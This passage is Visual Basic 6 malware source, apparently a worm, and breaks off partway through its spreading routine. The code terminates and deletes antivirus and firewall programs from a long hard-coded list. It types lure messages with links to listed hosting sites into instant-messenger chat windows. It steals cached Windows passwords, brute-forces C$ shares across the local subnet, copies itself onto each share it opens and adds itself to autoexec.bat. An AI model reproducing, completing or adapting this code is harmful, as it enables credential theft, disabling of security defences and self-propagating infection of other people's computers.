   Attribute VB_Name = "Module1"
   Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
   Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
   Private Declare Function ShowWindow Lib "user32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
   Private Declare Function GetForegroundWindow Lib "user32" () As Long
   Private Declare Function SetForegroundWindow Lib "user32" (ByVal hWnd As Long) As Long
   Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
   Private Declare Function EnumChildWindows Lib "user32" (ByVal hWndParent As Long, ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
   Private Declare Function AttachThreadInput Lib "user32" (ByVal idAttach As Long, ByVal idAttachTo As Long, ByVal fAttach As Long) As Long
   Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hWnd As Long, lpdwProcessId As Long) As Long

   Private Const SW_RESTORE = 9
   Private Const VK_CONTROL = &H11
   Private Const VK_RETURN = &HD
   Private Const WM_CHAR = &H102
   Private Const WM_SYSCHAR = &H106
   Private Const WM_KEYDOWN = &H100
   Private Const WM_KEYUP = &H101

   Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long
   Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hWnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
   Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef IpdwFlags As Long, ByVal dwReserved As Long) As Long

   Public Declare Function EnumProcesses Lib "psapi.dll" (ByRef lpidProcess As Long, ByVal cb As Long, ByRef cbNeeded As Long) As Long
   Public Declare Function GetModuleFileNameExA Lib "psapi.dll" (ByVal hProcess As Long, ByVal hModule As Long, ByVal ModuleName As String, ByVal nSize As Long) As Long
   Public Declare Function EnumProcessModules Lib "psapi.dll" (ByVal hProcess As Long, ByRef lphModule As Long, ByVal cb As Long, ByRef cbNeeded As Long) As Long

   Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
   Public Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
   Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
   Public Declare Function Process32First Lib "kernel32" (ByVal hSnapshot As Long, lppe As Any) As Long
   Public Declare Function Process32Next Lib "kernel32" (ByVal hSnapshot As Long, lppe As Any) As Long
   Public Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal lFlgas As Long, ByVal lProcessID As Long) As Long

   Public Const PROCESS_ALL_ACCESS = &H1F0FFF
   Public Const TH32CS_SNAPPROCESS As Long = 2&

   Public Type PROCESSENTRY32
     dwSize As Long
     cntUsage As Long
     th32ProcessID As Long
     th32DefaultHeapID As Long
     th32ModuleID As Long
     cntThreads As Long
     th32ParentProcessID As Long
     pcPriClassBase As Long
     dwFlags As Long
     szexeFile As String * 260
   End Type

   Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

   Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long

   Private Const GWL_WNDPROC = -4
   Private lpPrevWndProc As Long

   Public Declare Function WSAStartup Lib "wsock32.dll" (ByVal wVR As Long, lpWSAD As WSADATAType) As Long
   Public Declare Function WSACleanup Lib "wsock32.dll" () As Long
   Public Declare Function WSAIsBlocking Lib "wsock32.dll" () As Long
   Public Declare Function WSACancelBlockingCall Lib "wsock32.dll" () As Long

   Public Const WSADescription_Len = 256
   Public Const WSASYS_Status_Len = 128

   Public Type WSADATAType
     wversion As Integer
     wHighVersion As Integer
     szDescription(0 To WSADescription_Len) As Byte
     szSystemStatus(0 To WSASYS_Status_Len) As Byte
     iMaxSockets As Integer
     iMaxUdpDg As Integer
     lpszVendorInfo As Long
   End Type

   Public Declare Function gethostname Lib "wsock32.dll" (ByVal hostname$, ByVal HostLen As Long) As Long
   Public Declare Function gethostbyname Lib "wsock32.dll" (ByVal hostname$) As Long

   Public Type HostEnt
     h_name As Long
     h_aliases As Long
     h_addrtype As Integer
     h_length As Integer
     h_addr_list As Long
   End Type

   Public Declare Function inet_addr Lib "wsock32.dll" (ByVal cp As String) As Long
   Public Const INADDR_NONE = &HFFFF
   Public Const hostent_size = 16
   Public Const sockaddr_size = 16
   Public Const INVALID_SOCKET = -1
   Public Const SOCKET_ERROR = -1
   Public Const SOCK_STREAM = 1
   Public Const AF_INET = 2
   Public Const IPPROTO_TCP = 6

   Public Declare Function setsockopt Lib "wsock32.dll" (ByVal s As Long, ByVal level As Long, ByVal optname As Long, optval As Any, ByVal optlen As Long) As Long
   Public Declare Function getsockopt Lib "wsock32.dll" (ByVal s As Long, ByVal level As Long, ByVal optname As Long, optval As Any, optlen As Long) As Long

   Public Const SOL_SOCKET = &HFFFF&
   Public Const SO_LINGER = &H80&

   Public Type LingerType
     l_onoff As Integer
     l_linger As Integer
   End Type

   Public Declare Function htons Lib "wsock32.dll" (ByVal hostshort As Long) As Integer
   Public Declare Function socket Lib "wsock32.dll" (ByVal af As Long, ByVal s_type As Long, ByVal protocol As Long) As Long
   Public Declare Function connect Lib "wsock32.dll" (ByVal s As Long, addr As sockaddr, ByVal namelen As Long) As Long
   Public Declare Function send Lib "wsock32.dll" (ByVal s As Long, buf As Any, ByVal buflen As Long, ByVal flags As Long) As Long
   Public Declare Function closesocket Lib "wsock32.dll" (ByVal s As Long) As Long
   Public Declare Function recv Lib "wsock32.dll" (ByVal s As Long, buf As Any, ByVal buflen As Long, ByVal flags As Long) As Long

   Public Type sockaddr
     sin_family As Integer
     sin_port As Integer
     sin_addr As Long
     sin_zero As String * 8
   End Type

   Public Declare Function WSAAsyncSelect Lib "wsock32.dll" (ByVal s As Long, ByVal hWnd As Long, ByVal wMsg As Long, ByVal lEvent As Long) As Long
   Public Const FD_READ = &H1&
   Public Const FD_CONNECT = &H10&
   Public Const FD_CLOSE = &H20&

   Public Declare Function GetSystemDefaultLangID Lib "kernel32" () As Integer

   Public Declare Function GetLocaleInfo Lib "kernel32" Alias "GetLocaleInfoA" (ByVal Locale As Long, ByVal LCType As Long, ByVal lpLCData As String, ByVal cchData As Long) As Long

   Public Const LOCALE_SCOUNTRY = &H6

   Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   Public Const WM_CLOSE = &H10
   Public Declare Function EnumWindows Lib "user32" (ByVal lpfn As Long, lParam As Any) As Boolean
   Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long

   Public Declare Function WNetAddConnection2 Lib "mpr.dll" Alias "WNetAddConnection2A" (lpNetResource As NETRESOURCE, ByVal lpPassword As String, ByVal lpUserName As String, ByVal dwFlags As Long) As Long
   Public Declare Function WNetCancelConnection2 Lib "mpr.dll" Alias "WNetCancelConnection2A" (ByVal lpName As String, ByVal dwFlags As Long, ByVal fForce As Long) As Long

   Public Type NETRESOURCE
     dwScope As Long
     dwType As Long
     dwDisplayType As Long
     dwUsage As Long
     lpLocalName As String
     lpRemoteName As String
     lpComment As String
     lpProvider As String
   End Type

   Public Const RESOURCETYPE_DISK = &H1

   Public Const CONNECT_UPDATE_PROFILE = &H1

   Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long

   Public Declare Function GetVersionExA Lib "kernel32" (lpVersionInformation As OSVERSIONINFO) As Integer

   Public Type OSVERSIONINFO
     dwOSVersionInfoSize As Long
     dwMajorVersion As Long
     dwMinorVersion As Long
     dwBuildNumber As Long
     dwPlatformId As Long
     szCSDVersion As String * 128
   End Type

   Public Declare Sub MemCopy Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, ByVal Src As Long, ByVal cb&)

   Public Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Public Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long

   Public Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
   Public Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
   Public Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
   Public Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
   Public Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
   Public Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long

   Public Const REG_SZ = 1
   Public Const REG_EXPAND_SZ = 2
   Public Const REG_DWORD = 4

   Public Const KEY_ALL_ACCESS = &H3F
   Public Const REG_OPTION_NON_VOLATILE = 0

   Public Const HKEY_CLASSES_ROOT As Long = &H80000000
   Public Const HKEY_CURRENT_USER As Long = &H80000001
   Public Const HKEY_LOCAL_MACHINE As Long = &H80000002

   Public Const KEY_QUERY_VALUE As Long = &H1

   Public Declare Function WinExec Lib "kernel32" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long
   Public Const SW_NORMAL = 1

   Public Declare Function WNetEnumCachedPasswords Lib "mpr.dll" (ByVal s As String, ByVal i As Integer, ByVal b As Byte, ByVal proc As Long, ByVal l As Long) As Long
   Type PASWORD_TYPE
     Eintrag As Integer
     Quelle As Integer
     Pasword As Integer
     i As Byte
     nT As Byte
     Feld(1 To 1024) As Byte
   End Type

   Public Sey1 As String, Sey2 As String, Sey3 As String, StrPass As String
   Private spam(30) As String
   Public mysock As Long, Progress As Integer, do_cancel As Boolean, rtncode As Integer

   Public Function KAvWindow(ByVal hWnd As Long, lParam As Long) As Boolean
   'OK
   On Error Resume Next

   Dim WinTitle As String, l As Long

   av = Array("scan", "virus", "trojan", "panda", "troyan", "remover", _
   "mcafee", "firewall", "bitdefender", "security", "norton", "cleaner", _
   "norman", "the hacker", "thav", "avp", "symantec", "shopos", "avg")

   DoEvents

   WinTitle = Space$(255)

   l = GetWindowText(ByVal hWnd, ByVal WinTitle, ByVal Len(WinTitle))
   WinTitle = Left$(WinTitle, l)

   For i = 0 To UBound(av)

   If InStr(LCase(WinTitle), av(i)) <> 0 Then Call PostMessage(ByVal hWnd, WM_CLOSE, vbNull, vbNull)

   Next

   KAvWindow = True
   End Function

   Public Function EnumMSG(ByVal hWnd As Long, lParam As Long) As Boolean
   'OK
   On Error Resume Next
   Dim l As Long, x As Long, wnc As String

   DoEvents

   wnc = Space$(256)
   l = GetClassName(ByVal hWnd, wnc, Len(wnc))
   wnc = Left$(wnc, l)

   If InStr(LCase(wnc), "imwindowclass") <> 0 Then
   SpamMsn (hWnd)
   End If

   If InStr(LCase(wnc), "imclass") <> 0 Then
   SpamYms (hWnd)
   End If

   If InStr(LCase(wnc), "aim_imessage") <> 0 Then

   Dim aw As Long, Whs As Long, Whd As Long
   aw = GetForegroundWindow

   Call ShowWindow(hWnd, 9)

   If (aw <> hWnd) Then
   Whd = GetWindowThreadProcessId(aw, ByVal 0)
   Whs = GetWindowThreadProcessId(hWnd, ByVal 0)
   Call AttachThreadInput(Whs, Whd, True)
   Do
   Call SetForegroundWindow(ByVal hWnd)
   Loop Until GetForegroundWindow = hWnd
   End If

   Call EnumChildWindows(ByVal hWnd, AddressOf EnumChildProc, ByVal 0&)

   Sleep 1000
   Call AttachThreadInput(Whs, Whd, False)
   Call SetForegroundWindow(aw)
   End If

   If Left$(wnc, 1) = "#" Then
   SpamIcq (hWnd)
   End If

   EnumMSG = True
   End Function

   Public Function GetWeb() As String
   'OK
   On Error Resume Next
   Dim l As Integer, gw(8) As String
   Randomize: l = Int(Rnd * 8)
   gw(0) = "http://interserv1.thefreebizhost.com"
   gw(1) = "http://www.iespana.es/interserv4"
   gw(2) = "http://interserv5.thefreebizhost.com"
   gw(3) = "http://interserv6.mysitespace.com"
   gw(4) = "http://hosting.mixcat.com/interserv7"
   gw(5) = "http://n.1asphost.com/interserv8"
   gw(6) = "http://interserv9.t35.com"
   gw(7) = "http://interserv10.i-networx.de"
   GetWeb = gw(l)
   End Function

   Public Sub SetSpam()
   'OK
   On Error Resume Next
   If InStr(LCase(LangID()), "español") <> 0 Then
   spam(0) = "Mira esta foto " & GetWeb()
   spam(1) = "Mira esta pagina " & GetWeb() & " capaz te interese"
   spam(2) = "Te envio una postal " & GetWeb()
   spam(3) = "Como esta mi foto " & GetWeb()
   spam(4) = "Escucha el mp3 " & GetWeb()
   spam(5) = "Mira estos iconos para el msn " & GetWeb()
   spam(6) = "Gana dinero en internet " & GetWeb()
   spam(7) = "Mujeres a todo color, " & GetWeb()
   spam(8) = "Mira este cartoon, " & GetWeb()
   spam(9) = "Foto Ovni " & GetWeb()
   spam(10) = "Mira esta foto, esta buena " & GetWeb()
   spam(11) = "Ha recibido una postal electronica " & GetWeb()
   spam(12) = "Mira esta web " & GetWeb() & " ,Seguro te interesara"
   spam(13) = "Mira mi foto " & GetWeb()
   spam(14) = "XXX Sex Teens Lesb " & GetWeb()
   spam(15) = "Invitacion a iniciar Juego " & GetWeb()
   spam(16) = "Ha recibido un email " & GetWeb()
   spam(17) = "Gana dinero en internet " & GetWeb()
   spam(18) = "Mira esta ilusion optica " & GetWeb()
   spam(19) = "Bajate este video, esta bueno " & GetWeb()
   spam(20) = "Mira este Cartoon " & GetWeb()
   spam(21) = "Escucha este mp3 " & GetWeb()
   spam(22) = "Conoce los secretos de ocultismo " & GetWeb()
   spam(23) = "Nueva Seccion Manual de Seduccion " & GetWeb()
   spam(24) = "Conoces como piensa el sexo opuesto? " & GetWeb()
   spam(25) = "Solo para mayores de 18 años " & GetWeb()
   spam(26) = "Radio On-line " & GetWeb()
   spam(27) = "Invitacion para recibir señal de camara web " & GetWeb()
   spam(28) = "Cancion del Mamut tercera parte " & GetWeb()
   spam(29) = "Participa en el sorteo y gana una super computadora " & GetWeb()
   Else
   spam(0) = "looks at this picture " & GetWeb()
   spam(1) = "looks this " & GetWeb() & " capable it interests you"
   spam(2) = "A postal " & GetWeb() & " sends you"
   spam(3) = "As this my picture " & GetWeb()
   spam(4) = "listens the mp3 " & GetWeb()
   spam(5) = "looks at these icons for the msn " & GetWeb()
   spam(6) = "It makes money in internet " & GetWeb()
   spam(7) = "Women to all color, " & GetWeb()
   spam(8) = "looks at this cartoon, " & GetWeb()
   spam(9) = "Picture Ovni " & GetWeb()
   spam(10) = "looks at this picture, this good " & GetWeb()
   spam(11) = "has received a postcard electronic " & GetWeb()
   spam(12) = "looks at this web " & GetWeb() & " ,Sure it interested you"
   spam(13) = "looks at my picture " & GetWeb()
   spam(14) = "XXX Sex Teens Lesb " & GetWeb()
   spam(15) = "Invitation to begin Plays " & GetWeb()
   spam(16) = "has received an email " & GetWeb()
   spam(17) = "It makes money in internet " & GetWeb()
   spam(18) = "looks at this illusion optic " & GetWeb()
   spam(19) = "It discharges this video, this good " & GetWeb()
   spam(20) = "This Cartoon looks " & GetWeb()
   spam(21) = "listens this mp3 " & GetWeb()
   spam(22) = "knows the secrets of ocultismo " & GetWeb()
   spam(23) = "New Manual Section of Seduction " & GetWeb()
   spam(24) = "Do you know like thinks the opposite sex? " & GetWeb()
   spam(25) = "Alone it stops bigger than 18 years " & GetWeb()
   spam(26) = "Radio On-line " & GetWeb()
   spam(27) = "Invitation to receive sign of camera web " & GetWeb()
   spam(28) = "Song of the Mammoth third part " & GetWeb()
   spam(29) = "It participates in the I draw and it wins a super computer " & GetWeb()
   End If

   End Sub

   Private Sub SpamMsn(ByVal mHwnd)
   'OK
   On Error Resume Next
   Dim l As Long, aw As Long, Whs As Long, Whd As Long
   aw = GetForegroundWindow

   Call ShowWindow(mHwnd, 9)

   If (aw <> mHwnd) Then

   Whd = GetWindowThreadProcessId(aw, ByVal 0)
   Whs = GetWindowThreadProcessId(mHwnd, ByVal 0)

   Call AttachThreadInput(Whs, Whd, True)

   Do
   Call SetForegroundWindow(ByVal mHwnd)
   Loop Until GetForegroundWindow = mHwnd

   End If

   Randomize: sr = Int(Rnd * 30): Sleep 1000

   l = FindWindowEx(mHwnd, 0, "DirectUIHWND", vbNullString)

   If l = 0 Then Exit Sub

       For i = 1 To Len(spam(sr))
           Call PostMessage(l, WM_CHAR, Asc(Mid(spam(sr), i, 1)), 0)
       Next

   Call PostMessage(l, WM_KEYDOWN, VK_RETURN, 0&)
   Call PostMessage(l, WM_KEYUP, VK_RETURN, 0&)

   Sleep 1000
   Call AttachThreadInput(Whs, Whd, False)
   Call SetForegroundWindow(aw)
   End Sub

   Private Sub SpamYms(ByVal yHwnd)
   'OK
   On Error Resume Next
   Dim l As Long, aw As Long, Whs As Long, Whd As Long

   aw = GetForegroundWindow

   Call ShowWindow(yHwnd, 9)

   If (aw <> yHwnd) Then

   Whd = GetWindowThreadProcessId(aw, ByVal 0)
   Whs = GetWindowThreadProcessId(yHwnd, ByVal 0)

   Call AttachThreadInput(Whs, Whd, True)

   Do
   Call SetForegroundWindow(ByVal yHwnd)
   Loop Until GetForegroundWindow = yHwnd

   End If

   Randomize: sr = Int(Rnd * 30): Sleep 1000

   l = FindWindowEx(yHwnd, 0, "RICHEDIT20a", vbNullString)

   If l = 0 Then l = FindWindowEx(yHwnd, 0, "RICHEDIT", vbNullString)

   If l = 0 Then Exit Sub

       For i = 1 To Len(spam(sr))
           Call PostMessage(l, WM_CHAR, Asc(Mid(spam(sr), i, 1)), 0)
       Next

   Call PostMessage(l, WM_KEYDOWN, VK_RETURN, 0&)
   Call PostMessage(l, WM_KEYUP, VK_RETURN, 0&)

   Sleep 1000
   Call AttachThreadInput(Whs, Whd, False)
   Call SetForegroundWindow(aw)
   End Sub

   Public Function EnumChildProc(ByVal chWnd As Long, ByVal lParam As Long) As Long
   'OK
   On Error Resume Next
   Dim l As Long, wnc As String

   DoEvents

   wnc = Space$(256)
   l = GetClassName(ByVal chWnd, wnc, Len(wnc))
   wnc = Left$(wnc, l)

   If LCase(wnc) = "ate32class" Then
   SpamAim (chWnd)
   End If

   EnumChildProc = 1
   End Function

   Private Sub SpamAim(ByVal aHwnd)
   'OK
   Randomize: sr = Int(Rnd * 30): Sleep 1000

       For i = 1 To Len(spam(sr))
           Call PostMessage(aHwnd, WM_CHAR, Asc(Mid(spam(sr), i, 1)), 0)
       Next

   Call PostMessage(aHwnd, WM_KEYDOWN, VK_RETURN, 0&)
   Call PostMessage(aHwnd, WM_KEYUP, VK_RETURN, 0&)
   End Sub

   Private Sub SpamIcq(iHwnd)
   'OK
   On Error Resume Next
   Dim l As Long, aw As Long, Whs As Long, Whd As Long

   aw = GetForegroundWindow

   If (aw <> iHwnd) Then

   Whd = GetWindowThreadProcessId(aw, ByVal 0)
   Whs = GetWindowThreadProcessId(iHwnd, ByVal 0)

   Call AttachThreadInput(Whs, Whd, True)

   Do
   Call SetForegroundWindow(ByVal iHwnd)
   Loop Until GetForegroundWindow = iHwnd

   End If

   Randomize: sr = Int(Rnd * 30): Sleep 1000

   l = FindWindowEx(iHwnd, 0, "RICHEDIT20a", vbNullString)

   If l = 0 Then Exit Sub

   Call ShowWindow(iHwnd, 9)

       For i = 1 To Len(spam(sr))
           Call PostMessage(l, WM_CHAR, Asc(Mid(spam(sr), i, 1)), 0)
       Next

   Call PostMessage(l, WM_KEYDOWN, VK_CONTROL, 0&)
   Call PostMessage(l, WM_SYSCHAR, Asc("s"), 0&)
   Call PostMessage(l, WM_KEYUP, VK_CONTROL, 0&)

   Sleep 1000
   Call AttachThreadInput(Whs, Whd, False)
   Call SetForegroundWindow(aw)
   End Sub

   Public Sub KAVw9x()
   'OK
   On Error Resume Next

   Dim l As Long, l1 As Long, l2 As Long, Ol As Long, pShot As PROCESSENTRY32

   l1 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
   pShot.dwSize = Len(pShot)

   l2 = Process32First(l1, pShot)

   Do While l2

   If KAV(pShot.szexeFile) Then

   Ol = OpenProcess(0, False, pShot.th32ProcessID)
   l = TerminateProcess(Ol, 0)
   l = CloseHandle(Ol)

   Sleep 2000
   SA Left(pShot.szexeFile, InStr(pShot.szexeFile, ".") + 3), 0
   Kill Left(pShot.szexeFile, InStr(pShot.szexeFile, ".") + 3)
   End If

   l2 = Process32Next(l1, pShot)
   Loop

   l = CloseHandle(l1)
   End Sub

   Public Sub KAVw2k()
   'OK
   On Error Resume Next

   Dim cb As Long, cbNeeded As Long, NumElements As Long, ProcessIDs() As Long, cbNeeded2 As Long
   Dim Modules(1 To 1024) As Long, l As Long, ModuleName As String, nSize As Long, hPrs As Long, i As Integer

   cb = 8: cbNeeded = 96
       Do While cb <= cbNeeded
          cb = cb * 2: ReDim ProcessIDs(cb / 4) As Long:
          l = EnumProcesses(ProcessIDs(1), cb, cbNeeded)
       Loop

   NumElements = cbNeeded / 4
   For i = 1 To NumElements

           hPrs = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessIDs(i))
    If hPrs Then
    l = EnumProcessModules(hPrs, Modules(1), 1024, cbNeeded2)
    l = EnumProcessModules(hPrs, Modules(1), cbNeeded2, cbNeeded2)
     If l <> 0 Then
     ModuleName = Space(260): nSize = 500
     l = GetModuleFileNameExA(hPrs, Modules(1), ModuleName, nSize)
     ModuleName = Left$(ModuleName, l)
      If KAV(ModuleName) Then
      l = TerminateProcess(hPrs, 0)
      Sleep 2000
      SA ModuleName, 0
      Kill ModuleName
      End If
     End If
    End If
   l = CloseHandle(hPrs)
   Next

   End Sub

   Private Function KAV(StrExe)
   'OK
   On Error Resume Next
   kavscan = Array("avp", "avx", "adaware", "advxdwin", "alevir", "arr", "auto-protect", "Avg", "avw", "ahnsd", "apvxdwin", "alogserv", "avk", "ave32", "anti-trojan", "avsched32", "avconsol", "ackwin32", "advxdwin", "autodown", "alert", "amon", "avmon", "antivir", _
   "avsynmgr", "avnt", "avrep32", "ants", "atcon", "atupdater", "atwatch", "autotrace", "aplica32", "atro55en", "aupdate", "autoupdate", "avrescue", "agent", "avltmain", "backweb", "blackice", "blackd", "bd_professional", "bidef", "bidserver", "bipcp", _
   "bisp", "bootwarn", "borg2", "bs120", "buscareg", "clrav", "claw95ct", "cfiaudit", "cfiadmin", "cfgwiz", "cmgrdian", "ctrl", "cleaner", "cfind", "cfinet", "ccapp", "claw95", "cpd", "cleanpc", "cmon016", "cpf9x206", "cpfnt206", "csinject", _
   "csinsm32", "css1631", "cv", "cwnb181", "cwntdwmo", "ccevtmgr", "ccpxysvc", "dv95", "dvp95", "defwatch", "defalert", "doors", "deputy", "dpf", "drwatson", "drweb32", "drwebupw", "efinet32", "espwatch", "esafe", "efpeadm", "etrustcipe", _
   "evpn", "ecengine", "eli", "findviru", "f-agnt95", "frw", "f-stopw", "filemon", "fprot", "f-prot", "fch32", "fih32", "fp-win", "fsgk32", "fnrb32", "fsaa", "fameh32", "fast", "firewall", "fix-it", "flowprotector", "fp-win_trial", _
   "fsav", "fsm", "fwenc", "gbmenu", "gbpoll", "generics", "guard", "hacktracer", "htlog", "hwpe", "icssuppnt", "icload", "iamapp", "icsupp95", "ibma", "iomon98", "icmo", "iface", "iams", "ifw2000", "iparmor", "iris", "isrv95", "jed", "jammer", _
   "kpf", "kavlite", "kerio", "luall", "lookout", "lockdown", "lucomserver", "ldpromenu", "luspt", "ldnetmon", "ldpro", "localnet", "lsetup", "luau", "luinit", "luspt", "mpftray", "moolive", "msconfig", "mcafee", "monitor", "mcmnhdlr", _
   "mctool", "mcupdate", "mcvsrte", "mghtml", "minilog", "mcvsshld", "mpfservice", "mwatch", "mcshield", "mfw2en", "mfweng3", "mgavr", "mgui", "monsys", "monwow", "mrflux", "msinfo32", "mssmmc32", "mu0311ad", "mxtask", "nav", "netd32", "nod32", _
   "nspclean", "nmain", "nvc95", "nisum", "nupgrade", "nwtool16", "normist", "nisserv", "nsched32", "neowatchlog", "nvsvc32", "nwservice", "ntxconfig", "ntvdm", "npssvc", "npscheck", "netutils", "ndd32", "notstart", "nc2000", "ncinst4", "netarmor", "netinfo", _
   "netmon", "netspyhunter", "netstat", "norton", "npf", "nui", "nvarch16", "nvlaunch", "nwinst4", "nvapsvc", "outpost", "offguard", "ostronet", "procexp", "pcfwallicon", "programauditor", "pop3trap", "poproxy", "pcntmon", "padmin", "pview95", "pcc", "pav", _
   "per", "pqremove", "pfwcon", "pfwagent", "pfwsvc", "prebind", "panixk", "pcdsetup", "pcip10117_0", "pf2", "pfwadmin", "platin", "portdetective", "ppinupdt", "pptbc", "ppvstop", "procexplorerv1", "proport", "protect", "purge", _
   "pccntmon", "ping", "qconsole", "qserver", "rav", "regmon", "rescue", "rapapp", "rtvscn95", "rulaunch", "regedit", "regedt32", "realmon", "rshell", "stinger", "serv95", "scan", "safeweb", "symproxysvc", "symtray", "sphinx", _
   "smc", "spyxx", "ss3edit", "sbserv", "swnetsup", "sfc", "schedapp", "setupvameeval", "setup_flowprotector_us", "sgssfw32", "shellspyinstall", "shn", "sofi", "spf", "srwatch", "st2", "supftrl", "supporter5", "sweep", "sysdoc32", "sysedit", _
   "sharedaccess", "tbscan", "tds", "taumon", "tcm", "tfak", "th", "taskmon", "tauscan", "tc", "tgbob", "titanin", "tracer", "trjs", "trojan", "troyan", "tmntsrv", "undoboot", "Update", "vshwin32", "vet", "vsecomr", "vbcmserv", "vbcons", "vir -help", _
   "vptray", "vsmain", "vsmon", "vsstat", "vettray", "vcontrol", "vbust", "vbwin", "virus", "vccmserv", "vcsetup", "vfsetup", "vnlan300", "vnpc3000", "vpc", "vpfw30s", "vscenu6", "vsisetup", "vswin", "vvstat", "view", "wfindv32", "wimmun32", "wgfe95", "webtrap", _
   "watchdog", "wradmin", "wrctrl", "w32dsm89", "whoswatchingme", "winrecon", "winroute", "winsfcm", "wsbgate", "zonealarm", "zapro", "zap", "zcap", "zatutor", "zonestub", "zlclient", "zauinst", "zonalm2601", "taskmgr")

   For i = 0 To UBound(kavscan)
   DoEvents

    If InStr(LCase(StrExe), LCase(kavscan(i))) <> 0 Then KAV = True: Exit Function

   Next

   KAV = False
   End Function

   Public Sub GetPass()
   'OK
   On Error Resume Next
     Call WNetEnumCachedPasswords("", 0&, &HFF, AddressOf GetListPass, 0&)
   End Sub

   Public Function GetListPass(ret As PASWORD_TYPE, ByVal l&) As Integer
   'OK
   On Error Resume Next
   Dim x As Integer, Username As String, Pasword As String

       For x = 1 To ret.Quelle
         If ret.Feld(x) <> 0 Then
           Username = Username & Chr$(ret.Feld(x))
         Else
           Username = Username & " "
         End If
       Next x

       For x = ret.Quelle + 1 To (ret.Quelle + ret.Pasword)
         If ret.Feld(x) <> 0 Then
           Pasword = Pasword & Chr$(ret.Feld(x))
         Else
           Pasword = Pasword & " "
         End If
       Next x

       StrPass = StrPass & " U: " & Username & " P: " & Pasword & vbCrLf
       GetListPass = True
   End Function

   Public Sub CalcSbIp(ByVal ip)
   'OK
   On Error Resume Next
   pip = Left(ip, InStrRev(ip, "."))
   For c1 = 0 To 255
      ConecIP pip & c1
   Next
   End Sub

   Public Sub ConecIP(ByVal sip)
   'OK
   On Error Resume Next
   Dim NTR As NETRESOURCE, l As Long, dL As String

   dL = GLD

   NTR.dwType = RESOURCETYPE_DISK
   NTR.lpLocalName = dL
   NTR.lpRemoteName = "\\" & sip & "\C"
   NTR.lpProvider = ""

   For Each c1 In Cred()
     For Each c2 In Cred()

   l = WNetAddConnection2(NTR, CStr(c1), CStr(c2), CONNECT_UPDATE_PROFILE)
   If l = 0 Then CopyRed (dL): Exit Sub
   DoEvents

     Next
   Next
   End Sub

   Sub DeConecIp(ByVal cL)
   'OK
   On Error Resume Next
   Dim l As Long
   l = WNetCancelConnection2(cL, 0, True)
   End Sub

   Public Sub CopyRed(ByVal vL As String)
   'OK
   On Error Resume Next
   Dim R As String, dW As String

   R = RndName

   FileCopy Sp(3), vL & "\" & R

   If Dir(vL & "\autoexec.bat") <> "" Then
   SA vL & "\autoexec.bat", 0
   n = FrFile
    Open vL & "\autoexec.bat" For Append As #n
    Print #n, vbCrLf & "@win \" & R
    Close #n
   End If

   dW = Dir(vL & "\", vbDirectory + vbSystem + vbHidden + vbReadOnly)

   Do While Len(dW) <> 0

